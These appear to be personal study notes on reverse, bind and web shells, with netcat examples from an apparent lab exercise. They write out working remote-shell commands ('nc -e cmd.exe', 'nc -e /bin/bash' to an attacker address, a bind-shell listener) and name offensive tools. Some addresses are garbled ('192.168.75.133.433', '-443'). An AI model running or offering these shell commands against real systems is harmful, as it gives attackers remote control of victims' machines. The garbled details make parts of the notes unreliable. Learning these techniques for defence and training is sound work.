# Shells


**Reverse Shell**
attacker  <-  victim

Example: 
1. on Attacker:  `nc -l -v -p 443`   start listener (will listen on localhost -> here 192.168.75.133.433)
2. victim: opens application with trojaner (example powerpoint) and opens reverse shell 
  - would call: `nc.exe -e cmd.exe 192.168.75.133.433` to 
3. on attacker: shell is on vicims pc. Can for example explore filesystem

Example 2 (from exersice, running attacker and victim shell on same machine)
1. attacker: `nc -l -v -p 8080`
2. victim: `nc.traditional -e /bin/bash localhost 8080`     (recommended to be in a different folder as attacker shell as it is easier to check that it works)
3. attacher: is not on victims shell  (e.g. check via `pwd`)

Reverse shell is more common (because client connections are usually allowed)

**Bind shell**
attacker  ->  victim

Example
1. On victim `nc.exe -l -v 443 cmd.exe`  -> listener on 192.168.75.144 port 443  
2. Attacker: `nc -v 192.168.75.144 -443` -> is now on vicitms pc


**Web shell**
attacker -> vicitm (RAT)

RAT= Remote adminstration toolkit

- Downloadable tools
  - Covenant
  - hoaxshell
  - msfconsole
    - tool to create malware

**Varia**
NC (Netcat): `nc -h`  (Utility to send raw data over the network)
Sockat: `socat`  -> similar to nc but more capabilities (great tool)
metasploit

RCE: Remote code execution (what every attacker wants. )

